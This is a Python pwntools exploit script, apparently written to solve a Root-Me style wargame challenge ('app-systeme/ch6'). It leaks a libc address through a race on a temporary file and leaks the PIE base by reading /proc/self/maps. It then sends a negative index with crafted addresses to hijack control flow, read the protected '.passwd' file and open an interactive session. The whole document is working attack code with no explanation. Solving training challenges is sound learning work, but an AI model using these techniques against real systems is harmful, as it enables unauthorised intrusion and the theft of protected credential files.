#!/usr/bin/python

from pwn import *
import binascii
import random
import time
import sys
import os


filename = '/run/shm/a'

if len(sys.argv)>1:
    p = process(['./run'])
    gdb.attach(p)
    debug = True
else:
    p = process(['/challenge/app-systeme/ch6/ch6'])
    debug = False



def next_step(p, to_write_in=None):
    tmp = p.recvuntil('[6] Exit program')
    if to_write_in is not None:
        open(to_write_in, 'wb').write(tmp)
    else:
        print tmp
    return tmp

def ask_for_user(p, user):
    p.sendline('3')
    p.sendline(user)
    next_step(p)

def create_file_and_fill(l):
    f = open(filename, 'wb+')
    f.write('B'*l)
    f.close()

def delete_file():
    os.remove(filename)

def prepare_libc(p):
    ask_for_user(p, 'app-systeme-ch6')
    ask_for_user(p, 'app-systeme-ch6')
    create_file_and_fill(0x7f)
    p.sendline('5')
    p.sendline(filename)
    time.sleep(0.5)
    delete_file()
    time.sleep(0.5)
    p.sendline('0')
    next_step(p)
    create_file_and_fill(0x200)
    p.sendline('5')
    p.sendline(filename)
    time.sleep(0.5)
    create_file_and_fill(0x1)
    time.sleep(0.5)
    p.sendline('0')
    return next_step(p)

def prepare_pie(p):
    p.sendline('2')
    p.sendline('/proc/self/maps')
    return next_step(p)


next_step(p)

leaked = prepare_libc(p)
leaked_libc = u64(leaked[0x148:0x150])
libc_base = leaked_libc-0x3c36e0

leaked = prepare_pie(p).split('Please enter the file name: ')[1].split('-')[0]
leaked_pie = int(leaked, 16)
if not debug:
    target_pie_1 = leaked_pie+0x18db
    target_pie_2 = leaked_pie+0x19b0
else:
    target_pie_1 = leaked_pie+0x15c2
    target_pie_2 = leaked_pie+0x168f


p.send('-7'+'\x00'*6+p64(target_pie_1)[:-1])
p.sendline('.passwd')
p.recv()
print(binascii.hexlify(p.recv()))

p.send('-7'+'\x00'*6+p64(target_pie_2)[:-1])
p.recv()
print(binascii.hexlify(p.recv()))

p.interactive()
